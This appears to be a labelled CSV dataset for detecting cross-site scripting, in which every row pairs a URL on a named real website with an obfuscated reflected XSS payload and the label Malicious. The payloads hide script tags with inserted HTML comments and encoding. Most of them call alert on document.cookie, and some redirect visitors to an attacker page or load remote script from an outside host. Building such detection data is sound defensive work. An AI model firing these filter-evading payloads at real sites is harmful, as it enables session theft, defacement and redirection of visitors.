Payloads,Class
http://www.ebrular.com/galeri/igallery.asp?d=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;<!--Comment-->marquee&gt;&lt;marquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;<br<!--Comment-->><br<!--Comment-->>by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://www.kanald.com.tr/uyelikdiger2/bilgi.asp?strmes=&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`&quot;scriptorium`turkey`<br<!--Comment-->><br<!--Comment-->>hackhaber.com&quot;`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;,Malicious
http://www.ofsted.gov.uk/content/advancedsearch/summary?searchtext='&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`'www.xssed.com'`<br<!--Comment-->><br<!--Comment-->>&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,Malicious
http://www.gulftalent.com/home/canpositions-viewlist-s.php?currentpage=3&amp;recordsperpage=25&amp;name_flag<br<!--Comment-->><br<!--Comment-->>=&amp;from_search=true&amp;jobcat=&amp;industry=22&amp;seniority=&amp;frmpositioncountry=&amp;pastdate=&amp;from_possearch=&amp;pos_<br<!--Comment-->><br<!--Comment-->>ref=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`;&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;,Malicious
http://www.whhnfy.gov.cn/news.php?id=42%20%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`document.cookie`%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3e%3<br<!--Comment-->><br<!--Comment-->>cmarquee%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3eehl-i%20beyt%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e,Malicious
http://www.evpc.fr/fr/goto/recherche.html?searchval=http://www.e44.fr/fr/goto/recherche.html?searchv<br<!--Comment-->><br<!--Comment-->>al=http://www.e44.fr/fr/goto/recherche.html?searchval=%22%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`%22defaced%20by%20spon<br<!--Comment-->><br<!--Comment-->>sfull%22`;%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e,Malicious
http://www.carrefour.com/search?searchstring=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22security%20sux%22`%3c<!--Comment-->/script<br>%3e%3c<!--Comment-->/script<br>%3e%3c/script<br<!--Comment-->>%3e%3c/script<br<!--Comment-->>%3e,Malicious
http://www.co.new-castle.de.us/ems/home/photos/igallery.asp?d=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/scri<br>pt<!--Comment-->&gt;&lt;/scri<br<!--Comment-->>pt&gt;&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;by%20narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://www.cyprus-directory.com/cgi-bin/tseekdir.cgi?location=root-arts_and_humanities-museums%27%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%22cr4t3r%20was%20here%22%29;//%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://www.sitedebusca.com/busca.php?busca=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%22fzero%20rulez%20;%29%22%29%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e,Malicious
http://www.fender.com/products/search.php?section=guitars&amp;nodes=0&amp;node0=0&amp;search=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ea<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>lert%28window.document.height%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;submit.x=19&amp;submit.y=11,Malicious
http://search.chow.com/search?query=&amp;advanced=&amp;type=&amp;from_date=10+years+ago&amp;to_date=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`<br<!--Comment-->><br<!--Comment-->>'chow%20on%20these%20nuts!!!!!!!'`;&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&amp;sort_mode=&lt;/title<!--Comment-->&gt;&lt;/title<!--Comment-->&gt;test,Malicious
http://www.benq.com.my/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`'xss'`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;&lt;h<br<!--Comment-->>1&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://media.www.browndailyherald.com/media/storage/paper472/news/2007/09/26/campuswatch/common.app.<br<!--Comment-->><br<!--Comment-->>now.has.rival.in.universal.app-2992535.shtml%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`document.cookie`%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3e<br<!--Comment-->><br<!--Comment-->>%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`document.cookie`%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e,Malicious
http://www.uniformionline.it/login.asp?n=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`'xss'`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;by+narcoticxs&lt;<!--Comment--><br>/h1&gt;&lt;<!--Comment--><br>/h1&gt;&lt;<!--Comment--><br>/h1&gt;&lt;<!--Comment--><br>/h1&gt;&lt;<!--Comment--><br>/h1&gt;&lt;<!--Comment--><br>/h1&gt;&lt;<!--Comment--><br>/h1&gt;&lt;<!--Comment--><br>/h1&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://goldpassport.hyatt.com/gp/en/index.jsp?icamp=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%27xss_alert%27`%3c%2fsc<br>ript<!--Comment-->%3e%3c%2fsc<br>ript<!--Comment-->%3e%3c<!--Comment-->%2fsc<br>ript%3e%3c<!--Comment-->%2fsc<br>ript%3e&amp;_requestid=452793,Malicious
http://www.chiledeportes.gov.cl/prensa/noticias_detalle2.php?recordid=&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;document.location.hre<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>f = &quot;http://ownedbyar3sw0rmed.tk/&quot;;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,Malicious
http://mizahciyiz.biz/mods.php?go=downloads&amp;p=ld&amp;mode=file&amp;val=1%22%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3eby%20st@rext%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%<br<!--Comment-->><br<!--Comment-->>3cscript%3ealert`document.cookie`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.doleta.gov/advanced_search/search.cfm?count=49&amp;operation=7&amp;query=''&gt;&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;aler<br<!--Comment-->><br<!--Comment-->>t`document.cookie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;''&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;djsedat%20narcoticxs&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;,Malicious
http://28strega.mirkosoft.it/ifstat.asp?details=/forum/admin.asp&amp;page=8&amp;upage='%22%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3eale<br<!--Comment-->><br<!--Comment-->>rt`1`%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e,Malicious
http://www.arbookclub.com/reviewer.php?screen_name=&lt;<!--Comment-->/textarea&gt;&lt;/textarea<!--Comment-->&gt;'&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;<!--Comment-->/scr<br>ipt&gt;&lt;/scr<br<!--Comment-->>ipt&gt;,Malicious
http://a.idin.jp/index.jsp?i='%22%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3erubberduck%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3cbr<!--Comment-->%3e%3c<!--Comment-->br%3e%3cbr<!--Comment-->%3e%3c<!--Comment-->br%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3ewhitehat<br<!--Comment-->><br<!--Comment-->>%20forever%3c/marque<!--Comment-->%3e%3c/marque<!--Comment-->%3e,Malicious
http://videoradius.com/signinform.php?msg=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`/xssed/`%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e,Malicious
http://www.chimotkd.ca/gal/igallery.asp?d=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;by%<br<!--Comment-->><br<!--Comment-->>20narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://www.cracklooker.com/search.shtml?s=%27%3e%22%3e%3c<!--Comment-->script%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2f<br>x.js%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2f<br>x.js<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,Malicious
http://www.konami.com/konami/ctl3810/cp18756/cl0/brands?attrib_search=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`&quot;cruelwolf&quot;`&lt;/<br<!--Comment-->>script&gt;&lt;/<br<!--Comment-->>script&gt;,Malicious
http://www.mmrthefacts.nhs.uk/search.php?keywords=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22xss%22`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.innomarketing.ro/search.html?search_box=%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`/xssed%20by%20dr.optix!%20why?%<br<!--Comment-->><br<!--Comment-->>20because%20i%20can!/`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
http://computex.ws/index.asp?searchtext=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%27e1+wuz+here%27%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;lt=s<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>earch,Malicious
http://www.largepassions.com/desearch/search.html?start=80&amp;citystate=all%3ala%27%22%3e%3cimg%20src=k<br<!--Comment-->>.png%20onerror=alert`/xss/.source`%20/%3e%3cimg%20src=k<br<!--Comment-->>.png%20onerror=alert`/xss/.source`%20/%3e&amp;country=usa&amp;minage=&amp;maxage=&amp;lookingfor=&amp;onlyphotos=&amp;groupn<br<!--Comment-->><br<!--Comment-->>ame=&amp;loggedin=&amp;fullcount=239&amp;keywords=,Malicious
http://www.f-secure.com/en_emea/products/mobile/anti-theft-download/anti-theft-download-wizard.html?<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>hidmanufacturer=%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28/mikko%20rulz/%29%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,Malicious
"http://www.alliedmetals.com/product/product_detail.php?productid=39&catid=""><script<!--Comment--><script<!--Comment-->><script<!--Comment--><script<!--Comment-->>alert`1`</script<!--Comment--></script<!--Comment-->></script<!--Comment--></script<!--Comment-->>",Malicious
http://www.nmm.ac.uk/server/show/nav.2909/by/4/keyword/olympiad%27%22%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealer<br<!--Comment-->><br<!--Comment-->>t`1337`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c/marquee<!--Comment-->%3e%3c<!--Comment-->/marquee%3e,Malicious
"http://phonebook.lanl.gov/index.php?search=yes&amp;personal=';alert`string.fromcharcode`88,83,83``//\';a<br<!--Comment-->><br<!--Comment-->>lert`string.fromcharcode`88,83,83``//%22;alert`string.fromcharcode`88,83,83``//\%22;alert`string.fro<br<!--Comment-->><br<!--Comment-->>mcharcode`88,83,83``//--%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%22%3e'%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`string.fromcharcode`88,83,83``%3<br<!--Comment-->><br<!--Comment-->>c/script%3e",Malicious
"http://gaana.com/#/playlists/""/></s<!--Comment-->cript></s<!--Comment-->cript><sc<!--Comment-->ript><script<!--Comment-->>alert`""xss: vijayendra""`</script<!--Comment-->></s<!--Comment-->cript>",Malicious
http://www.webftp.sk/index.php?server=%22%3e%27%3e%22%3c%27%3c%3cscript<!--Comment-->%3e%3c%27%3c%3cscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%27%25%3c<!--Comment-->%2<br>7%3e%3c%2<br<!--Comment-->>7%3e%22%3e%3c<!--Comment-->script%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3c<!--Comment-->script%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e&amp;port=21&amp;user=&amp;passw<br<!--Comment-->><br<!--Comment-->>ord=,Malicious
http://www.maths.tcd.ie/emis/journals/lrg/about/search.html%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`13<br<!--Comment-->><br<!--Comment-->>37`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e,Malicious
